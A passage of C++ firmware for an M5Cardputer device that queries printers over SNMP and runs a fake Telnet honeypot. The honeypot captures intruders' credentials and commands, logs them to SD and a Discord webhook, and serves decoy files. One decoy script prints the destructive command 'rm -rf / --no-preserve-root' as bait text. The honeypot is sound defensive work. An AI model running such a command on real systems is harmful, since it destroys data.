    memcpy(&packet[pos], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
    pos += strlen(SNMP_COMMUNITY);

    // PDU header
    packet[pos++] = 0xA0; // GET Request
    int pduLengthPos = pos++;

    packet[pos++] = 0x02; // Integer (request ID)
    packet[pos++] = 0x01;
    packet[pos++] = 0x01; // Request ID = 1

    packet[pos++] = 0x02; // Integer (error status)
    packet[pos++] = 0x01;
    packet[pos++] = 0x00; // No error

    packet[pos++] = 0x02; // Integer (error index)
    packet[pos++] = 0x01;
    packet[pos++] = 0x00; // No error

    // Variable bindings
    packet[pos++] = 0x30; // SEQUENCE (Variable-binding structure)
    int vbSequenceLengthPos = pos++; // Placeholder for the length of the entire variable-binding sequence

    // Single variable-binding
    packet[pos++] = 0x30; // SEQUENCE (Single variable-binding)
    int vbLengthPos = pos++; // Placeholder for the length of this variable-binding

    // Add the OID
    packet[pos++] = 0x06; // OBJECT IDENTIFIER
    uint8_t encodedOID[32];
    int encodedLen = encodeOID(oid, encodedOID, sizeof(encodedOID));
    if (encodedLen < 0) return false;
    packet[pos++] = encodedLen; // Length of OID
    memcpy(&packet[pos], encodedOID, encodedLen);
    pos += encodedLen;

    // Add the value (NULL)
    packet[pos++] = 0x05; // NULL
    packet[pos++] = 0x00; // Length of NULL

    // Calculate the length of the single variable-binding
    packet[vbLengthPos] = pos - vbLengthPos - 1;

    // Calculate the length of the variable-binding sequence
    packet[vbSequenceLengthPos] = pos - vbSequenceLengthPos - 1;

    // Update the PDU and SNMP message lengths
    packet[pduLengthPos] = pos - pduLengthPos - 1;
    packet[lengthPos] = pos - lengthPos - 1;

    /*// Debug: Print the packet being sent
    Serial.println(F("[DEBUG] Sending SNMP Packet:"));
    for (int i = 0; i < pos; i++) {
        Serial.printf("%02X ", packet[i]);
    }
    Serial.println();*/
    
    // Envoi du paquet
    udp.beginPacket(printerIP, SNMP_PORT);
    udp.write(packet, pos);
    udp.endPacket();
    
    // Attente de la rÃ©ponse
    uint32_t startTime = millis();
    while (millis() - startTime < 1000) {
        int packetSize = udp.parsePacket();
        if (packetSize) {
            uint8_t buffer[255];
            udp.read(buffer, sizeof(buffer));
    
            /*// Debug : afficher le paquet received
            Serial.println(F("[DEBUG] Received SNMP Response:"));
            for (int i = 0; i < packetSize; i++) {
                Serial.printf("%02X ", buffer[i]);
            }
            Serial.println();*/
    
            // Appel Ã  une fonction de parsing BER-SNMP (Ã  implÃ©menter ou Ã  inclure d'une librairie)
            String parsedValue;
            if (parseSNMPResponse(buffer, packetSize, parsedValue)) {
                response = parsedValue;
            } else {
                response = F("Parsing error");
            }
    
            return true;
        }
    }
    
    return false;
}

void checkPrinterStatus() {
    int displayStart = 0;
    int lineHeight = 12;
    int maxLines = M5.Display.height() / lineHeight;
    bool needsDisplayUpdate = true;

    if (WiFi.localIP().toString() == "0.0.0.0") {
      waitAndReturnToMenu("Not connected...");
      return;
    }

    // On prÃ©pare notre vecteur de lignes Ã  afficher
    std::vector<String> printerLines;
    printerLines.reserve(50); // Par exemple, on rÃ©serve un peu d'espace

    // Chemin de config
    String printerConfigPath = "/evil/Printer/PrinterIp.txt";
    std::vector<IPAddress> printerIPs;

    // Lecture du fichier IP
    if (SD.exists(printerConfigPath)) {
        File config = SD.open(printerConfigPath);
        if (config) {
            while (config.available()) {
                String line = config.readStringUntil('\n');
                line.trim();
                IPAddress ip;
                if (ip.fromString(line)) {
                    printerIPs.push_back(ip);
                }
            }
            config.close();
        }
    }

    if (printerIPs.empty()) {
        Serial.println(F("[INFO] No printers detected or configured."));
        printerIPs = detectedPrinters;
        
    }

    // OIDs SNMP
    const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1";
    const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1";
    const char* uptimeOid = "1.3.6.1.2.1.1.3.0";

    // Pour chaque imprimante
    for (const auto& printerIP : printerIPs) {
        String device = "Unknown";
        String status = "Unknown";
        String uptime = "Unknown";

        bool okDevice = sendSNMPRequest(printerIP, deviceOid, device);
        bool okStatus = sendSNMPRequest(printerIP, statusOid, status);
        bool okUptime = sendSNMPRequest(printerIP, uptimeOid, uptime);

        printerLines.push_back("-----------------------");
        printerLines.push_back(printerIP.toString()); 
        printerLines.push_back("-----------------------");

        // DEVICE
        if (okDevice) {
            printerLines.push_back(device);
            Serial.printf("[INFO] %s => Device: %s\n", 
                          printerIP.toString().c_str(), 
                          device.c_str());
        } else {
            printerLines.push_back("Device: Error");
            Serial.printf("[ERROR] %s => Device fetch failed\n",
                          printerIP.toString().c_str());
        }

        // STATUS
        if (okStatus) {
            // Convertir la valeur (1..5) en chaÃ®ne
            if (status.equals("1"))      status = "Unknown";
            else if (status.equals("2")) status = "Running";
            else if (status.equals("3")) status = "Warning";
            else if (status.equals("4")) status = "Testing";
            else if (status.equals("5")) status = "Down";
            else                         status = "Other";

            printerLines.push_back(status);
            Serial.printf("[INFO] %s => Status: %s\n", 
                          printerIP.toString().c_str(), 
                          status.c_str());
        } else {
            printerLines.push_back("Status: Error");
            Serial.printf("[ERROR] %s => Status fetch failed\n",
                          printerIP.toString().c_str());
        }

        if (okUptime) {
            // Si par ex. "113021400 (raw ticks)"
            if (uptime.endsWith("(raw ticks)")) {
                int spaceIndex = uptime.indexOf(' ');
                if (spaceIndex > 0) {
                    String ticksStr = uptime.substring(0, spaceIndex);
                    uint32_t ticksVal = ticksStr.toInt();

                    // Convert ticks in j/h/m/s
                    uint32_t totalSeconds = ticksVal / 100;
                    uint32_t days    = totalSeconds / 86400;
                    uint32_t hours   = (totalSeconds % 86400) / 3600;
                    uint32_t minutes = (totalSeconds % 3600) / 60;
                    uint32_t seconds = totalSeconds % 60;

                    char buff[64];
                    snprintf(buff, sizeof(buff),
                             "%ud %02u:%02u:%02u", days, hours, minutes, seconds);
                    uptime = String(buff);
                }
            }
            printerLines.push_back(uptime);
            Serial.printf("[INFO] %s => Uptime: %s\n",
                          printerIP.toString().c_str(),
                          uptime.c_str());
        } else {
            printerLines.push_back("Uptime: Error");
            Serial.printf("[ERROR] %s => Uptime fetch failed\n",
                          printerIP.toString().c_str());
        }
    }

    printerLines.push_back("-----------------------");
    printerLines.push_back("Scan Terminated.");
    printerLines.push_back("-----------------------");

    displayStart = 0; // on remet Ã  zÃ©ro l'index de scroll
    needsDisplayUpdate = true;
    enterDebounce();
    while (true) {
        M5Cardputer.update();

        if (handleScrolling(displayStart, maxLines, printerLines.size())) {
            needsDisplayUpdate = true;
        }

        if (needsDisplayUpdate) {
            displayResults(displayStart, maxLines, printerLines);
            needsDisplayUpdate = false;
        }

        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) { 
            break;
        }
        delay(50);
    }

    waitAndReturnToMenu("return to menu");
}


/*
============================================================================================================================
// HoneyPot
============================================================================================================================
*/

// -- Global configuration --
int honeypotPort = 23; 
String honeypotLogFile = "/evil/honeypot_logs.txt"; 
WiFiServer honeypotServer(honeypotPort);

// -- Start the Telnet honeypot --
void startHoneypot() {
    honeypotServer.begin();
    Serial.println("Fake Telnet service started on port " + String(honeypotPort));
    M5.Display.clear(); // Effacer l'Ã©cran
    M5.Display.setTextSize(1.5);
    M5.Display.setCursor(5, 5);
    M5.Display.setTextColor(menuTextUnFocusedColor);
    M5.Display.println("Honeypot Started !");
    M5.Display.println("Waiting interaction...");
    while (true) {
        M5Cardputer.update();
        honeypotLoop();   
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) { 
            break;
        }
        delay(10);
    }
    honeypotServer.stop();
    Serial.println(F("Honeypot stopped."));
    waitAndReturnToMenu("Honeypot stopped.");
}

// -- Main loop to check for incoming clients --
void honeypotLoop() {
    WiFiClient client = honeypotServer.available();
    if (client) {
        handleHoneypotClient(client);
    }
}

// -- Log commands and credentials to a file on SD --
#define MAX_LOG_LINES 4 // Nombre maximum de lignes affichÃ©es Ã  l'Ã©cran
String logBuffer[MAX_LOG_LINES]; // Buffer circulaire pour les logs
int currentLogIndex = 0; // Index du prochain emplacement dans le buffer


// -- Log commands and credentials to a file on SD and display on screen with scrolling --
void logHoneypotCommand(String clientIP, String command) {
    File logFile = SD.open(honeypotLogFile, FILE_APPEND);
    if (!logFile) {
        Serial.println(F("Error: Unable to open log file."));
        return;
    }

    String logEntry = "[" + String(millis()) + "] ";
    logEntry += "IP: " + clientIP + " - Command: " + command;
    logFile.println(logEntry);
    logFile.close();

    Serial.println(F("------------------"));
    Serial.println("IP: " + clientIP);
    Serial.println("Command: " + command);
    Serial.println(F("------------------"));

    // Ajout au buffer circulaire
    String formattedLog = "IP: " + clientIP + "\n" + command + "\n------------------";
    logBuffer[currentLogIndex] = formattedLog;
    currentLogIndex = (currentLogIndex + 1) % MAX_LOG_LINES;

    redrawScreenWithLogs();

    // -- Envoi sur Discord --
    if (WiFi.status() == WL_CONNECTED && discordWebhookURL.length() > 0) {
        HTTPClient http;
        http.begin(discordWebhookURL);
        http.addHeader("Content-Type", "application/json");

        String jsonPayload = "{\"content\":\"ðŸ“¡ **Honeypot Alert**\\nðŸ” IP: " + clientIP + "\\nðŸ’» Command: `" + command + "`\\n_____________________________________________\"}";

        int httpResponseCode = http.POST(jsonPayload);

        if (httpResponseCode > 0) {
            Serial.println(F("Webhook Discord envoyÃ© !"));
        } else {
            Serial.println("Erreur envoi webhook Discord : " + String(httpResponseCode));
        }
        http.end();
    }
}


// -- Helper function to redraw the screen with all logs in the buffer --
void redrawScreenWithLogs() {
    M5.Display.clear(); // Effacer l'Ã©cran
    M5.Display.setTextSize(1.5);
    M5.Display.setCursor(5, 5);
    M5.Display.setTextColor(menuTextUnFocusedColor);
    
    // Afficher les logs du buffer dans l'ordre
    int startIndex = currentLogIndex; // Commencer par la position actuelle dans le buffer
    for (int i = 0; i < MAX_LOG_LINES; i++) {
        int index = (startIndex + i) % MAX_LOG_LINES;
        if (logBuffer[index] != "") { // Ignorer les lignes vides (au dÃ©marrage)
            M5.Display.println(logBuffer[index]);
        }
    }
}


// -- Handle interaction with a single Telnet client --
void handleHoneypotClient(WiFiClient client) {
    // Prompt pour le login
    client.print("\r\nlogin: ");
    String username = readLine(client, false);  // pas d'Ã©cho
    logHoneypotCommand(client.remoteIP().toString(), "LOGIN username: " + username);
  
    // Prompt pour le password
    client.print("Password: ");
    String password = readLine(client, false);
    logHoneypotCommand(client.remoteIP().toString(), "LOGIN password: " + password);
  
    // Simulation dâ€™un login rÃ©ussi (peu importe les identifiants)
    client.println("\r\nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-109-generic x86_64)");
    client.println(" * Documentation:  https://help.ubuntu.com");
    client.println(" * Management:     https://landscape.canonical.com");
    client.println(" * Support:        https://ubuntu.com/advantage\r\n");
  
    // Ã‰mulation dâ€™un shell
    String currentDirectory = "/home/pi";
    String prompt = "pi@ubuntu:~$ ";
  
    while (client.connected() || !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      M5Cardputer.update();
      client.print(prompt);
      String command = readLine(client, false); // on ne renvoie jamais les caractÃ¨res
      command.trim();
  
      // Log de la commande
      logHoneypotCommand(client.remoteIP().toString(), command);
  
      //------------------------------------------------
      // 1. Commandes de sortie
      //------------------------------------------------
      if (command.equalsIgnoreCase("exit") || command.equalsIgnoreCase("logout")) {
        client.println("Goodbye.");
        break;
      }
  
      //------------------------------------------------
      // 2. Commandes classiques
      //------------------------------------------------
      else if (command.equals("pwd")) {
        client.println(currentDirectory);
      }
      else if (command.equals("whoami")) {
        client.println("pi");
      }
      else if (command.equals("uname -a")) {
        client.println("Linux ubuntu 5.4.0-109-generic #123-Ubuntu SMP x86_64 GNU/Linux");
      }
      else if (command.equals("hostname")) {
        client.println("ubuntu");
      }
      else if (command.equals("uptime")) {
        client.println(" 12:15:01 up 1:15,  2 users,  load average: 0.00, 0.03, 0.00");
      }
      else if (command.equals("free -h")) {
        client.println("              total        used        free      shared  buff/cache   available");
        client.println("Mem:          1000M        200M        600M         10M        200M        700M");
        client.println("Swap:         1024M          0B       1024M");
      }
      else if (command.equals("df -h")) {
        client.println("Filesystem      Size  Used Avail Use% Mounted on");
        client.println("/dev/sda1        50G   15G   33G  31% /");
        client.println("tmpfs           100M  1.2M   99M   2% /run");
        client.println("tmpfs           500M     0  500M   0% /dev/shm");
      }
      else if (command.equals("ps aux")) {
        client.println("USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND");
        client.println("root         1   0.0  0.1  22564  1124 ?        Ss   12:00   0:01 /sbin/init");
        client.println("root       539   0.0  0.3  46896  3452 ?        Ss   12:00   0:00 /lib/systemd/systemd-journald");
        client.println("pi        1303   0.0  0.2  10820  2220 pts/0    Ss+  12:05   0:00 bash");
        client.println("pi        1304   0.0  0.2  10820  2152 pts/1    Ss+  12:06   0:00 bash");
      }
      else if (command.equals("top")) {
        client.println("top - 12:10:11 up  1:10,  2 users,  load average: 0.01, 0.05, 0.00");
        client.println("Tasks:  93 total,   1 running,  92 sleeping,   0 stopped,   0 zombie");
        client.println("%Cpu(s):  0.0 us,  0.2 sy,  0.0 ni, 99.7 id,  0.1 wa,  0.0 hi,  0.0 si,  0.0 st");
        client.println("MiB Mem :   1000.0 total,    600.0 free,    200.0 used,    200.0 buff/cache");
        client.println("MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.    700.0 avail Mem");
        client.println("");
        client.println("  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND");
        client.println(" 1303 pi        20   0   10820   2220   2168 S   0.0  0.2   0:00.03 bash");
        client.println(" 1304 pi        20   0   10820   2152   2096 S   0.0  0.2   0:00.01 bash");
      }
  
      //------------------------------------------------
      // 3. Navigation et gestion de fichiers
      //------------------------------------------------
      else if (command.startsWith("ls")) {
        // On affiche des fichiers diffÃ©rents selon currentDirectory
        bool longListing = (command.indexOf("-l") >= 0);
  
        // /home/pi
        if (currentDirectory.equals("/home/pi")) {
          if (longListing) {
            client.println("total 20");
            client.println("drwxr-xr-x  2 pi  pi  4096 Jan  1 12:00 Documents");
            client.println("drwxr-xr-x  2 pi  pi  4096 Jan  1 12:00 Downloads");
            client.println("-rw-r--r--  1 pi  pi   220 Jan  1 12:00 .bashrc");
            client.println("-rw-r--r--  1 pi  pi  3523 Jan  1 12:00 .profile");
            client.println("-rw-r--r--  1 pi  pi    50 Jan  1 12:00 secrets.txt");
          } else {
            client.println("Documents  Downloads  .bashrc  .profile  secrets.txt");
          }
        }
        // /home/pi/Documents
        else if (currentDirectory.equals("/home/pi/Documents")) {
          if (longListing) {
            client.println("total 16");
            client.println("-rw-r--r--  1 pi  pi   80 Jan  1 12:00 mysql_credentials.txt");
            client.println("-rw-r--r--  1 pi  pi  120 Jan  1 12:00 password_list.txt");
            client.println("-rw-r--r--  1 pi  pi  600 Jan  1 12:00 financial_report_2023.xlsx");
            client.println("-rw-r--r--  1 pi  pi   20 Jan  1 12:00 readme.md");
          } else {
            client.println("mysql_credentials.txt  password_list.txt  financial_report_2023.xlsx  readme.md");
          }
        }
        // /home/pi/Downloads
        else if (currentDirectory.equals("/home/pi/Downloads")) {
          if (longListing) {
            client.println("total 8");
            client.println("-rw-r--r--  1 pi  pi  102 Jan  1 12:00 malware.sh");
            client.println("-rw-r--r--  1 pi  pi  250 Jan  1 12:00 helpful_script.py");
          } else {
            client.println("malware.sh  helpful_script.py");
          }
        }
        else if (currentDirectory.equals("/home")) {
          if (longListing) {
            client.println("total 8");
            client.println("drw-r--r--  1 pi  pi  102 Jan  1 12:00 pi");
          } else {
            client.println("pi");
          }
        }
        else if (currentDirectory.equals("/")) {
          if (longListing) {
            client.println("total 8");
            client.println("drw-r--r--  1 pi  pi  102 Jan  1 12:00 home");
          } else {
            client.println("home");
          }
        }
        // Autres rÃ©pertoires
        else {
          // Par dÃ©faut, on met un ls vide ou un message
          client.println("No files found.");
        }
      }
      else if (command.startsWith("cd ")) {
        String newDir = command.substring(3);
        newDir.trim();
  
        // Simulation du changement de rÃ©pertoire
        if (newDir.equals("..")) {
          // Retour en arriÃ¨re dans l'arborescence
          if (currentDirectory.equals("/home/pi")) {
            currentDirectory = "/home";
            prompt = "pi@ubuntu:/home$ ";
          }
          else if (currentDirectory.equals("/home")) {
            currentDirectory = "/";
            prompt = "pi@ubuntu:/$ ";
          }
          else if (currentDirectory.equals("/")) {
            client.println("bash: cd: ..: No such file or directory");
          }
          else {
            client.println("bash: cd: ..: No such file or directory");
          }
        }
        else if (newDir.equals("/") || newDir.equals("~")) {
          // Aller Ã  la racine ou au rÃ©pertoire utilisateur
          currentDirectory = (newDir.equals("~")) ? "/home/pi" : "/";
          prompt = (newDir.equals("~")) ? "pi@ubuntu:~$ " : "pi@ubuntu:/$ ";
        }
        else if (newDir.equals("home") && currentDirectory.equals("/")) {
          // Aller explicitement Ã  /home depuis /
          currentDirectory = "/home";
          prompt = "pi@ubuntu:/home$ ";
        }
        else if (newDir.equals("pi") && currentDirectory.equals("/home")) {
          // Aller explicitement Ã  /home/pi depuis /home
          currentDirectory = "/home/pi";
          prompt = "pi@ubuntu:~$ ";
        }
        else if (newDir.equals("Documents") && currentDirectory.equals("/home/pi")) {
          // Aller Ã  Documents uniquement si on est dans /home/pi
          currentDirectory = "/home/pi/Documents";
          prompt = "pi@ubuntu:~/Documents$ ";
        }
        else if (newDir.equals("Downloads") && currentDirectory.equals("/home/pi")) {
          // Aller Ã  Downloads uniquement si on est dans /home/pi
          currentDirectory = "/home/pi/Downloads";
          prompt = "pi@ubuntu:~/Downloads$ ";
        }
        else {
          // Gestion des chemins absolus ou chemins non valides
          if (newDir.startsWith("/home/pi/")) {
            if (newDir.equals("/home/pi/Documents")) {
              currentDirectory = "/home/pi/Documents";
              prompt = "pi@ubuntu:~/Documents$ ";
            } else if (newDir.equals("/home/pi/Downloads")) {
              currentDirectory = "/home/pi/Downloads";
              prompt = "pi@ubuntu:~/Downloads$ ";
            } else {
              client.println("bash: cd: " + newDir + ": No such file or directory");
            }
          } else if (newDir.startsWith("/home/")) {
            currentDirectory = "/home";
            prompt = "pi@ubuntu:/home$ ";
          } else {
            client.println("bash: cd: " + newDir + ": No such file or directory");
          }
        }
      }
      else if (command.startsWith("mkdir ")) {
        String dirName = command.substring(6);
        dirName.trim();
        client.println("Directory '" + dirName + "' created.");
      }
      else if (command.startsWith("rmdir ")) {
        String dirName = command.substring(6);
        dirName.trim();
        client.println("Directory '" + dirName + "' removed.");
      }
      else if (command.startsWith("rm ")) {
        client.println("File removed successfully.");
      }
      else if (command.startsWith("mv ") || command.startsWith("cp ")) {
        client.println("Operation completed successfully.");
      }
      else if (command.startsWith("chmod ")) {
        client.println("Permissions changed.");
      }
      else if (command.startsWith("chown ")) {
        client.println("Ownership changed.");
      }
      else if (command.startsWith("touch ")) {
        String fileName = command.substring(6);
        fileName.trim();
        client.println("File '" + fileName + "' created or timestamp updated.");
      }
  
      //------------------------------------------------
      // 4. Lecture de fichiers (cat)
      //------------------------------------------------
      else if (command.startsWith("cat ")) {
        String fileName = command.substring(4);
        fileName.trim();
  
        // Gestion de cas particuliers absolus
        if (fileName == "/etc/passwd") {
          client.println("root:x:0:0:root:/root:/bin/bash");
          client.println("daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin");
          client.println("bin:x:2:2:bin:/bin:/usr/sbin/nologin");
          client.println("sys:x:3:3:sys:/dev:/usr/sbin/nologin");
          client.println("pi:x:1000:1000:,,,:/home/pi:/bin/bash");
        }
        else if (fileName == "/etc/shadow") {
          client.println("root:*:18948:0:99999:7:::");
          client.println("daemon:*:18948:0:99999:7:::");
          client.println("bin:*:18948:0:99999:7:::");
          client.println("sys:*:18948:0:99999:7:::");
          client.println("pi:$6$randomsalt$somehashedpassword:18948:0:99999:7:::");
        }
        else {
          // On gÃ¨re les chemins relatifs ou absolus (simples) en tenant compte du currentDirectory
          // Pour simplifier, on traite les fichiers "connus" en fonction du rÃ©pertoire courant
  
          // Normaliser si besoin (ex: cat /home/pi/Documents/...).
          // On peut faire un check direct, ou reconstituer le "fullPath".
          String fullPath = fileName;
          if (!fileName.startsWith("/")) {
            // c'est un chemin relatif => on le rattache au currentDirectory
            fullPath = currentDirectory + "/" + fileName;
          }
  
          // /home/pi/secrets.txt
          if (fullPath == "/home/pi/secrets.txt") {
            client.println("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7NGGYUNGGYD");
            client.println("AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYNGGYUNGGYD");
          }
          // /home/pi/Documents/mysql_credentials.txt
          else if (fullPath == "/home/pi/Documents/mysql_credentials.txt") {
            client.println("host=localhost");
            client.println("user=admin");
            client.println("password=My5up3rP@ss");
            client.println("database=production_db");
          }
          // /home/pi/Documents/password_list.txt
          else if (fullPath == "/home/pi/Documents/password_list.txt") {
            client.println("facebook:  fbpass123");
            client.println("gmail:     gmPass!0");
            client.println("twitter:   tw_pass_2025");
          }
          // /home/pi/Documents/financial_report_2023.xlsx (fichier binaire, on simule)
          else if (fullPath == "/home/pi/Documents/financial_report_2023.xlsx") {
            client.println("This appears to be a binary file (Excel).");
            client.println("ï¿½PK\003\004... (truncated) ...");
          }
          // /home/pi/Documents/readme.md
          else if (fullPath == "/home/pi/Documents/readme.md") {
            client.println("# README");
            client.println("This is a sample markdown file. Nothing special here.");
          }
          // /home/pi/Downloads/malware.sh
          else if (fullPath == "/home/pi/Downloads/malware.sh") {
            client.println("#!/bin/bash");
            client.println("echo 'Running malware...'");
            client.println("rm -rf / --no-preserve-root");
          }
          // /home/pi/Downloads/helpful_script.py
          else if (fullPath == "/home/pi/Downloads/helpful_script.py") {
            client.println("#!/usr/bin/env python3");
            client.println("print('Just a helpful script.')");
          }
          // Sinon, fichier inconnu
          else {
            client.println("cat: " + fileName + ": No such file or directory");
          }
        }
      }
  
      //------------------------------------------------
      // 5. Commandes rÃ©seau souvent utilisÃ©es
      //------------------------------------------------
      else if (command.equals("ifconfig")) {
        client.println("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500");
        client.println("        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255");
        client.println("        inet6 fe80::d6be:d9ff:fe1b:220c  prefixlen 64  scopeid 0x20<link>");
        client.println("        RX packets 1243  bytes 234567 (234.5 KB)");
        client.println("        TX packets 981   bytes 123456 (123.4 KB)");
      }
      else if (command.equals("ip addr")) {
        client.println("1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000");
        client.println("    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00");
        client.println("    inet 127.0.0.1/8 scope host lo");
        client.println("    inet6 ::1/128 scope host ");
        client.println("2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000");
        client.println("    link/ether aa:bb:cc:dd:ee:ff brd ff:ff:ff:ff:ff:ff");
        client.println("    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0");
      }
      else if (command.startsWith("ping ")) {
        String target = command.substring(5);
        client.println("PING " + target + " (1.2.3.4) 56(84) bytes of data.");
        client.println("64 bytes from 1.2.3.4: icmp_seq=1 ttl=64 time=0.042 ms");
        client.println("64 bytes from 1.2.3.4: icmp_seq=2 ttl=64 time=0.043 ms");
        client.println("--- " + target + " ping statistics ---");
        client.println("2 packets transmitted, 2 received, 0% packet loss, time 1ms");
      }
      else if (command.equals("netstat -an")) {
        client.println("Active Internet connections (servers and established)");
        client.println("Proto Recv-Q Send-Q Local Address           Foreign Address         State");
        client.println("tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN");
        client.println("tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN");
        client.println("tcp        0      0 192.168.1.10:23         192.168.1.100:54321     ESTABLISHED");
      }
      else if (command.startsWith("wget ") || command.startsWith("curl ")) {
        String url = command.substring(command.indexOf(" ") + 1);
        client.println("Connecting to " + url + "...");
        client.println("HTTP request sent, awaiting response... 200 OK");
        client.println("Length: 1024 (1.0K) [text/html]");
        client.println("Saving to: â€˜index.htmlâ€™");
        client.println("index.html         100%[==========>]  1.00K  --.-KB/s    in 0s");
        client.println("Download completed.");
      }
  
      //------------------------------------------------
      // 6. Commandes de services et de packages
      //------------------------------------------------
      else if (command.startsWith("apt-get ")) {
        if (command.indexOf("update") >= 0) {
          client.println("Get:1 http://archive.ubuntu.com/ubuntu focal InRelease [265 kB]");
          client.println("Get:2 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]");
          client.println("Reading package lists... Done");
        }
        else if (command.indexOf("install") >= 0) {
          client.println("Reading package lists... Done");
          client.println("Building dependency tree");
          client.println("Reading state information... Done");
          client.println("The following NEW packages will be installed:");
          client.println("  <some-package>");
          client.println("0 upgraded, 1 newly installed, 0 to remove and 5 not upgraded.");
          client.println("Need to get 0 B/123 kB of archives.");
          client.println("After this operation, 345 kB of additional disk space will be used.");
          client.println("Selecting previously unselected package <some-package>.");
          client.println("(Reading database ... 45% )");
          client.println("Unpacking <some-package> (from <some-package>.deb) ...");
          client.println("Setting up <some-package> ...");
          client.println("Processing triggers for man-db (2.9.1-1) ...");
        }
        else {
          client.println("E: Invalid operation " + command.substring(7));
        }
      }
      else if (command.startsWith("service ")) {
        // service <nom> start/stop/status/restart
        if (command.indexOf("start") >= 0) {
          client.println("Starting service " + command.substring(8) + "...");
          client.println("Service started.");
        }
        else if (command.indexOf("stop") >= 0) {
          client.println("Stopping service " + command.substring(8) + "...");
          client.println("Service stopped.");
        }
        else if (command.indexOf("restart") >= 0) {
          client.println("Restarting service " + command.substring(8) + "...");
          client.println("Service restarted.");
        }
        else if (command.indexOf("status") >= 0) {
          client.println(command.substring(8) + " is running.");
        }
        else {
          client.println("Usage: service <service> {start|stop|restart|status}");
        }
      }
      else if (command.startsWith("systemctl ")) {
        // ex: systemctl status ssh
        if (command.indexOf("start") >= 0) {
          client.println("Systemd: Starting service...");
          client.println("Done.");
        }
        else if (command.indexOf("stop") >= 0) {
          client.println("Systemd: Stopping service...");
          client.println("Done.");
        }
        else if (command.indexOf("restart") >= 0) {
          client.println("Systemd: Restarting service...");
          client.println("Done.");
        }
        else if (command.indexOf("status") >= 0) {
          client.println("â— ssh.service - OpenBSD Secure Shell server");
          client.println("   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)");
          client.println("   Active: active (running) since Wed 2025-01-23 12:00:00 UTC; 1h 4min ago");
          client.println(" Main PID: 600 (sshd)");
          client.println("    Tasks: 1 (limit: 4915)");
          client.println("   CGroup: /system.slice/ssh.service");
        }
        else {
          client.println("systemctl: command not recognized or incomplete arguments.");
        }
      }
  
      //------------------------------------------------
      // 7. Commandes dâ€™Ã©lÃ©vation de privilÃ¨ges
      //------------------------------------------------
      else if (command.startsWith("sudo ")) {
        client.println("[sudo] password for pi: ");
        delay(1000);
        client.println("pi is not in the sudoers file.  This incident will be reported.");
      }
  
      //------------------------------------------------
      // 8. Commandes diverses
      //------------------------------------------------
      else if (command.equals("env")) {
        client.println("SHELL=/bin/bash");
        client.println("PWD=" + currentDirectory);
        client.println("LOGNAME=pi");
        client.println("HOME=/home/pi");
        client.println("LANG=C.UTF-8");
      }
      else if (command.equals("set")) {
        client.println("BASH=/bin/bash");
        client.println("BASHOPTS=cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:histappend:interactive_comments:progcomp");
        client.println("PWD=" + currentDirectory);
        client.println("HOME=/home/pi");
        client.println("LANG=C.UTF-8");
      }
      else if (command.equals("alias")) {
        client.println("alias ls='ls --color=auto'");
        client.println("alias ll='ls -alF'");
        client.println("alias l='ls -CF'");
      }
      else if (command.equals("history")) {
        // Petite simulation dâ€™historique
        client.println("    1  pwd");
        client.println("    2  ls -l");
        client.println("    3  whoami");
        client.println("    4  cat /etc/passwd");
        client.println("    5  sudo su");
      }
      else if (command.equals("iptables")) {
        client.println("Chain INPUT (policy ACCEPT)");
        client.println("target     prot opt source               destination         ");
        client.println("Chain FORWARD (policy ACCEPT)");
        client.println("target     prot opt source               destination         ");
        client.println("Chain OUTPUT (policy ACCEPT)");
        client.println("target     prot opt source               destination         ");
      }
      //------------------------------------------------
      // 9. Commande supplÃ©mentaire.
      //------------------------------------------------
      else if (command.equals("id")) {
        client.println("uid=1000(pi) gid=1000(pi) groups=1000(pi)");
      }
      else if (command.equals("lsb_release -a")) {
        client.println("Distributor ID: Ubuntu");
        client.println("Description:    Ubuntu 20.04.5 LTS");
        client.println("Release:        20.04");
        client.println("Codename:       focal");
      }
      else if (command.equals("cat /etc/issue")) {
        client.println("Ubuntu 20.04.5 LTS \\n \\l");
      }
      else if (command.equals("cat /proc/version")) {
        client.println("Linux version 5.4.0-109-generic (buildd@lgw01-amd64-039) (gcc version 9.3.0, GNU ld version 2.34) #123-Ubuntu SMP");
      }
      else if (command.equals("cat /proc/cpuinfo")) {
        client.println("processor   : 0");
        client.println("vendor_id   : GenuineIntel");
        client.println("cpu family  : 6");
        client.println("model       : 158");
        client.println("model name  : Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz");
        client.println("stepping    : 10");
        client.println("microcode   : 0xca");
        client.println("cpu MHz     : 1992.000");
        client.println("cache size  : 8192 KB");
      }
      else if (command.equals("lscpu")) {
        client.println("Architecture:        x86_64");
        client.println("CPU op-mode(s):      32-bit, 64-bit");
        client.println("Byte Order:          Little Endian");
        client.println("CPU(s):              4");
        client.println("Vendor ID:           GenuineIntel");
        client.println("Model name:          Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz");
        client.println("CPU MHz:             1992.000");
      }
      else if (command.equals("dmesg")) {
